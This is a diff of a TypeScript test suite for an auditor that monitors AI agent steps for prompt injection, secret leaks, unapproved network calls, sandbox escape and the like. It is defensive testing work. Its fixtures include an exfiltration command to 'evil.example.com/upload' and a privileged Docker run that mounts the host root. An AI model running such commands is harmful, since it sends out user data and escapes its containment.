@@ -6,13 +6,18 @@ import type { TraceRecord, TraceSpan } from "../trace/trace-model.js";
 import { emptyUsage } from "../trace/trace-model.js";
 import { TraceStore } from "../trace/trace-store.js";
 import { ArkApiError } from "../../ark-client.js";
-import type { AgentRunner } from "../../types.js";
+import type { AgentRunner, PromptCache } from "../../types.js";
 import { TraceService } from "../trace/trace-service.js";
 import { createRedactor } from "../trace/redaction.js";
 import { codexRuntime } from "../../runtimes/codex.js";
 import { AuditMemory } from "./audit-memory.js";
 import { AuditService } from "./audit-service.js";
 import { AuditStore } from "./audit-store.js";
+import {
+  INJECTION_SYSTEM_PROMPT,
+  INTENT_STEP_SYSTEM_PROMPT,
+  SUMMARY_SYSTEM_PROMPT,
+} from "./step-checks.js";
 import { IntentReducer } from "../intent/intent-reducer.js";
 import { AUDITOR_OBJECTIVE } from "../intent/intent-model.js";
 import { ContextService } from "../context/context-service.js";
@@ -31,21 +36,33 @@ interface FakeResponder {
   respond: (model: string, user: string, system: string) => string;
 }
 
-// auditStep's checks 0, 3 and 4 are all given the same step context, so the
-// only thing that says which one is asking is its system prompt.
-function checkOf(system: string): string {
-  if (system.includes("You are an Intent Scope Detector")) return "identify";
-  if (system.includes("You are summarising one step")) return "summary";
-  if (system.includes("against the user's stated intent")) return "intent";
-  if (system.includes("for security signals")) return "injection";
-  if (system.includes("Credentials were detected")) return "secrets";
-  if (system.includes("URLs were found in the text")) return "network";
-  if (system.includes("escape the sandbox")) return "tool";
-  if (system.includes("wrote to one or more sinks")) return "sinks";
-  if (system.includes("settling them, now that")) return "back-trace";
-  if (system.includes("went on to carry any of them out")) return "forward-trace";
-  if (system.includes("auditing an auditor")) return "meta";
+// auditStep's checks 0, 3 and 4 are all given the same step context AND the
+// same system prompt — that sameness is what lets them share a cache — so the
+// question each is asking is found by reading both turns. The markers are
+// unchanged from when they were only ever in the system turn.
+function markerOf(text: string): string {
+  if (text.includes("You are an Intent Scope Detector")) return "identify";
+  if (text.includes("You are summarising one step")) return "summary";
+  if (text.includes("against the user's stated intent")) return "intent";
+  if (text.includes("for security signals")) return "injection";
+  if (text.includes("Credentials were detected")) return "secrets";
+  if (text.includes("URLs were found in the text")) return "network";
+  if (text.includes("escape the sandbox")) return "tool";
+  if (text.includes("wrote to one or more sinks")) return "sinks";
+  if (text.includes("settling them, now that")) return "back-trace";
+  if (text.includes("went on to carry any of them out")) return "forward-trace";
+  if (text.includes("auditing an auditor")) return "meta";
   return "other";
+}
+
+function checkOf(system: string, user: string): string {
+  const named = markerOf(system);
+  // The user turn is read only when the system turn does not name a check —
+  // which is exactly the three always-on step checks, now sharing one system
+  // prompt so they can share a cache. Reading it unconditionally would let an
+  // auditor's own prompts, quoted back as evidence in a meta audit, pass for
+  // the question being asked.
+  return named === "other" ? markerOf(user) : named;
 }
 
 // The fakes answer as a provider, which is the boundary a test wants to hold.
@@ -78,7 +95,7 @@ function runnerFor(client: FakeClient): AgentRunner {
 function fakeClient(responder: FakeResponder): FakeClient {
   return {
     complete: async ({ model, user, system }) => {
-      responder.calls.push({ model, user, system, check: checkOf(system) });
+      responder.calls.push({ model, user, system, check: checkOf(system, user) });
       return { content: responder.respond(model, user, system) };
     },
   };
@@ -757,7 +774,7 @@ describe("AuditService", () => {
     const responder: FakeResponder = {
       calls: [],
       respond: (_model, user, system) => {
-        if (checkOf(system) !== "injection") return SAFE_VERDICT;
+        if (checkOf(system, user) !== "injection") return SAFE_VERDICT;
         if (!user.includes("Previously detected external directives")) {
           return JSON.stringify({
             dangerous: false,
@@ -1138,8 +1155,8 @@ describe("auditing the auditor", () => {
     const stores = await makeStores();
     const responder: FakeResponder = {
       calls: [],
-      respond: (_model, _user, system) =>
-        checkOf(system) === "meta"
+      respond: (_model, user, system) =>
+        checkOf(system, user) === "meta"
           ? '{"unsupportedFindings":["claimed more than the evidence shows"],"missedSignals":[],"reason":"overreach"}'
           : SAFE_VERDICT,
     };
@@ -1187,8 +1204,8 @@ describe("auditing the auditor", () => {
     const stores = await makeStores();
     const responder: FakeResponder = {
       calls: [],
-      respond: (_model, _user, system) =>
-        checkOf(system) === "meta"
+      respond: (_model, user, system) =>
+        checkOf(system, user) === "meta"
           ? '{"unsupportedFindings":["one"],"missedSignals":[],"reason":"r"}'
           : SAFE_VERDICT,
     };
@@ -1219,8 +1236,8 @@ describe("auditing the auditor", () => {
     const stores = await makeStores();
     const responder: FakeResponder = {
       calls: [],
-      respond: (_model, _user, system) =>
-        checkOf(system) === "meta"
+      respond: (_model, user, system) =>
+        checkOf(system, user) === "meta"
           ? '{"unsupportedFindings":["claimed more than the evidence shows"],"missedSignals":[],"reason":"overreach"}'
           : SAFE_VERDICT,
     };
@@ -1311,8 +1328,8 @@ describe("auditing the auditor", () => {
     const stores = await makeStores();
     const responder: FakeResponder = {
       calls: [],
-      respond: (_model, _user, system) =>
-        checkOf(system) === "meta"
+      respond: (_model, user, system) =>
+        checkOf(system, user) === "meta"
           ? '{"unsupportedFindings":["one"],"missedSignals":[],"reason":"r"}'
           : SAFE_VERDICT,
     };
@@ -1407,8 +1424,8 @@ describe("auditing the auditor", () => {
     const stores = await makeStores();
     const responder: FakeResponder = {
       calls: [],
-      respond: (_model, _user, system) =>
-        checkOf(system) === "meta"
+      respond: (_model, user, system) =>
+        checkOf(system, user) === "meta"
           ? '{"unsupportedFindings":[],"missedSignals":[],"reason":"sound"}'
           : SAFE_VERDICT,
     };
@@ -2099,8 +2116,8 @@ describe("AuditService conditional step checks", () => {
         arguments: '{"cmd":"npm test"}',
         output: "Error: see https://docs.example.com/troubleshooting for help",
       }),
-      (_model, _user, system) =>
-        checkOf(system) === "network"
+      (_model, user, system) =>
+        checkOf(system, user) === "network"
           ? JSON.stringify({
               calls: [
                 {
@@ -2129,8 +2146,8 @@ describe("AuditService conditional step checks", () => {
         arguments: '{"cmd":"curl https://evil.example.com/upload"}',
         output: "OK",
       }),
-      (_model, _user, system) =>
-        checkOf(system) === "network"
+      (_model, user, system) =>
+        checkOf(system, user) === "network"
           ? JSON.stringify({
               calls: [
                 {
@@ -2162,8 +2179,8 @@ describe("AuditService conditional step checks", () => {
         arguments: '{"cmd":"curl https://evil.example.com/upload"}',
         output: "OK",
       }),
-      (_model, _user, system) =>
-        checkOf(system) === "network" ? "not json at all" : SAFE_VERDICT,
+      (_model, user, system) =>
+        checkOf(system, user) === "network" ? "not json at all" : SAFE_VERDICT,
       ["api.github.com"],
     );
 
@@ -2186,8 +2203,8 @@ describe("AuditService conditional step checks", () => {
         arguments: '{"cmd":"docker run --privileged -v /:/host alpine"}',
         output: "started",
       }),
-      (_model, _user, system) =>
-        checkOf(system) === "tool"
+      (_model, user, system) =>
+        checkOf(system, user) === "tool"
           ? JSON.stringify({
               misuse: true,
               flags: ["--privileged", "-v /:/host"],
@@ -2231,8 +2248,8 @@ describe("AuditService conditional step checks", () => {
         }),
         output: "written",
       }),
-      (_model, _user, system) =>
-        checkOf(system) === "sinks"
+      (_model, user, system) =>
+        checkOf(system, user) === "sinks"
           ? JSON.stringify({
               writes: [
                 {
@@ -2269,8 +2286,8 @@ describe("AuditService conditional step checks", () => {
         }),
         output: "written",
       }),
-      (_model, _user, system) =>
-        checkOf(system) === "sinks"
+      (_model, user, system) =>
+        checkOf(system, user) === "sinks"
           ? JSON.stringify({
               writes: [
                 {
@@ -2289,5 +2306,100 @@ describe("AuditService conditional step checks", () => {
         .listByTrace("trace-sink-2")
         .filter((finding) => finding.finding.startsWith("Wrote ")),
     ).toEqual([]);
+  });
+});
+
+// The three always-on checks are given one step's evidence and differ only in
+// the question that trails it. That sameness is the whole reason a provider
+// cache can serve them, so it is asserted here rather than left to the prompts.
+describe("AuditService step evidence caching", () => {
+  const ALWAYS_ON = ["summary", "intent", "injection"];
+
+  function cacheSpy(id: string | null) {
+    const opened: { model: string; system: string; prefix: string }[] = [];
+    return {
+      opened,
+      open: async (input: { model: string; system: string; prefix: string }) => {
+        opened.push(input);
+        return id;
+      },
+    };
+  }
+
+  async function auditWith(
+    traceId: string,
+    promptCache: PromptCache | undefined,
+  ) {
+    const stores = await makeStores();
+    const responder: FakeResponder = { calls: [], respond: () => SAFE_VERDICT };
+    const service = new AuditService({
+      traceStore: stores.traceStore,
+      auditStore: stores.auditStore,
+      traceService: stores.traceService,
+      context: stores.contextStore,
+      runner: runnerFor(fakeClient(responder)),
+      ...(promptCache ? { promptCache } : {}),
+      securityModel: "sec-model",
+      intentModel: "intent-model",
+      networkWhitelist: null,
+      intentReducer: noChangeReducer(),
+      memory: stores.auditMemory,
+      enabled: true,
+    });
+    service.start();
+    seedTrace(stores.traceStore, traceId);
+    stores.traceStore.appendSpan(traceId, toolSpan(traceId, "ok"));
+    await service.idle();
+    return { stores, responder };
+  }
+
+  it("asks the three always-on checks over one identical system turn and body", async () => {
+    const { responder } = await auditWith("trace-cache-1", undefined);
+
+    const checks = responder.calls.filter((call) =>
+      ALWAYS_ON.includes(call.check),
+    );
+    expect(checks).toHaveLength(3);
+    expect(new Set(checks.map((call) => call.system)).size).toBe(1);
+    // Each user turn is the shared evidence plus that check's own question, so
+    // everything preceding the question has to be one string.
+    const questions = [
+      SUMMARY_SYSTEM_PROMPT,
+      INTENT_STEP_SYSTEM_PROMPT,
+      INJECTION_SYSTEM_PROMPT,
+    ];
+    const bodies = checks.map((call) => {
+      const question = questions.find((text) => call.user.endsWith(text));
+      expect(question).toBeDefined();
+      return call.user.slice(0, call.user.length - (question?.length ?? 0));
+    });
+    expect(new Set(bodies).size).toBe(1);
+    expect(new Set(checks.map((call) => call.user)).size).toBe(3);
+  });
+
+  it("opens one cache per step, before any check has asked", async () => {
+    const cache = cacheSpy("ctx-1");
+    const { responder } = await auditWith("trace-cache-2", cache);
+
+    // Racing this inside the fan-out would open three and hit none.
+    expect(cache.opened).toHaveLength(1);
+    expect(cache.opened[0]?.model).toBe("sec-model");
+    // The evidence, not any one check's question.
+    expect(cache.opened[0]?.prefix).toContain("## Step under audit");
+    expect(cache.opened[0]?.system).not.toContain("You are summarising");
+    expect(
+      responder.calls.filter((call) => ALWAYS_ON.includes(call.check)),
+    ).toHaveLength(3);
+  });
+
+  it("audits normally when the provider would not open a cache", async () => {
+    const cache = cacheSpy(null);
+    const { responder, stores } = await auditWith("trace-cache-3", cache);
+
+    expect(cache.opened).toHaveLength(1);
+    expect(
+      responder.calls.filter((call) => ALWAYS_ON.includes(call.check)),
+    ).toHaveLength(3);
+    expect(stores.auditStore.countStepsForTrace("trace-cache-3")).toBe(1);
   });
 });
